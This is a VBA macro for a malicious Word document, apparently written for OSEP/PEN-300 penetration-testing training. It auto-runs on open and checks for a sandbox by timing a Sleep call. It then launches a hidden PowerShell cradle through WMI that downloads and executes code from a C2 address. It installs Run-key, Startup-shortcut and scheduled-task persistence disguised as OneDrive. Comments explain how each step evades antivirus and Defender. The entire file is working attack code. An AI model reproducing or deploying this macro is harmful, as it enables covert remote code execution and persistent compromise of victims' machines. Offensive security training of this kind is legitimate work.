Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' ─────────────────────────────────────────────────────────────────────────────
' OSEP / PEN-300 DOC vector — AV-evasive Office macro.
'
' STAGE 1: De-chained PowerShell download cradle via WMI (child of WmiPrvSE.exe)
' STAGE 2: Three persistence mechanisms (Run key, Startup LNK, scheduled task)
'
' Shellcode lives externally in run.txt on the C2. This macro carries nothing
' that resembles a shellcode signature.
'
' POLLER_B64 below must be populated before saving as .docm. See:
'   tools/encode_poller.py shared/activate_poller.ps1
' Then paste the output between the quotes.
' ─────────────────────────────────────────────────────────────────────────────

' Populated per engagement. Base64 (UTF-16LE) of shared/activate_poller.ps1.
' Example generation:
'   python3 tools/encode_poller.py shared/activate_poller.ps1
Const POLLER_B64 As String = "PASTE_BASE64_BLOB_HERE"

' ---------------------------------------------------------------------------
' Auto-execute entry points
' ---------------------------------------------------------------------------
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    Dim t1 As Date, t2 As Date, timeDelta As Long
    Dim pid As Long

    ' --- Emulator detection (Mod 11.6.1) ---
    ' AV heuristic emulators fast-forward through Sleep. If the wall clock
    ' did not advance by ~2 seconds, we are in a sandbox and bail.
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    timeDelta = DateDiff("s", t1, t2)
    If timeDelta < 2 Then Exit Sub

    ' --- Stage 1: de-chained PowerShell download cradle via WMI (Mod 11.8.2) ---
    ' GetObject("winmgmts:") spawns PowerShell as a child of WmiPrvSE.exe,
    ' not of WINWORD.EXE. Behavioral detection that flags "Office spawning
    ' PowerShell" is bypassed.
    strArg = "powershell -exec bypass -nop -w hidden -c " & _
             "iex((new-object system.net.webclient)." & _
             "downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid

    ' --- Stage 2: persistence ---
    Call PersistRunKey
    Call PersistStartupLink
    Call PersistScheduledTask
End Sub

' ---------------------------------------------------------------------------
' Persistence 1: HKCU Run key
' HKCU-scoped, no admin required, survives normal reboots. Value name
' "OneDriveSync" camouflages the entry in the Registry Editor.
' ---------------------------------------------------------------------------
Sub PersistRunKey()
    Dim cmd As String
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    cmd = "powershell -exec bypass -nop -w hidden -c " & _
          "iex((new-object system.net.webclient)." & _
          "downloadstring('http://192.168.119.120/run.txt'))"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", _
                 cmd, "REG_SZ"
End Sub

' ---------------------------------------------------------------------------
' Persistence 2: Startup folder LNK
' ---------------------------------------------------------------------------
Sub PersistStartupLink()
    Dim startup As String
    Dim sh As Object, lnk As Object
    startup = Environ("APPDATA") & _
              "\Microsoft\Windows\Start Menu\Programs\Startup\"
    Set sh = CreateObject("WScript.Shell")
    Set lnk = sh.CreateShortcut(startup & "OneDrive Sync.lnk")
    lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lnk.Arguments = "-exec bypass -nop -w hidden -c " & _
                    "iex((new-object system.net.webclient)." & _
                    "downloadstring('http://192.168.119.120/run.txt'))"
    lnk.WindowStyle = 7
    lnk.Description = "OneDrive Sync"
    lnk.Save
End Sub

' ---------------------------------------------------------------------------
' Persistence 3: scheduled task (on-demand callback)
'
' NO .ps1 FILE ON DISK. The poller body is embedded in POLLER_B64 above as
' base64 (UTF-16LE) and passed to powershell.exe via -EncodedCommand in the
' scheduled task's action argument.
'
' Why Register-ScheduledTask instead of schtasks.exe:
'   schtasks.exe /tr has a documented 261-character limit on the argument.
'   A full poller blob is several KB. Register-ScheduledTask (PowerShell
'   cmdlet) has no such practical limit and accepts the encoded blob
'   directly.
'
' Why this defeats disk-level signatures:
'   Defender scans files on read. With -File update.ps1, the file contained
'   the plaintext AMSI-bypass strings and got flagged before PowerShell
'   even parsed it. With -EncodedCommand, no .ps1 file exists; the blob is
'   built as a scheduled task argument, which Defender does not treat as a
'   PowerShell script file.
' ---------------------------------------------------------------------------
Sub PersistScheduledTask()
    Dim sh As Object
    Dim psCmd As String
    Dim actionArg As String

    Set sh = CreateObject("WScript.Shell")

    ' Build the -EncodedCommand argument for the scheduled task action
    actionArg = "-exec bypass -nop -w hidden -enc " & POLLER_B64

    ' Register-ScheduledTask: 5-minute repetition, current user context,
    ' hidden window, task named to match cover story.
    psCmd = "powershell -exec bypass -nop -w hidden -c " & _
            """" & _
            "$a = New-ScheduledTaskAction -Execute 'powershell.exe' " & _
            "-Argument '" & actionArg & "'; " & _
            "$t = New-ScheduledTaskTrigger -Once -At (Get-Date) " & _
            "-RepetitionInterval (New-TimeSpan -Minutes 5); " & _
            "$s = New-ScheduledTaskSettingsSet -Hidden " & _
            "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; " & _
            "Register-ScheduledTask -TaskName 'OneDriveUpdate' " & _
            "-Action $a -Trigger $t -Settings $s -Force" & _
            """"

    sh.Run psCmd, 0, False
End Sub
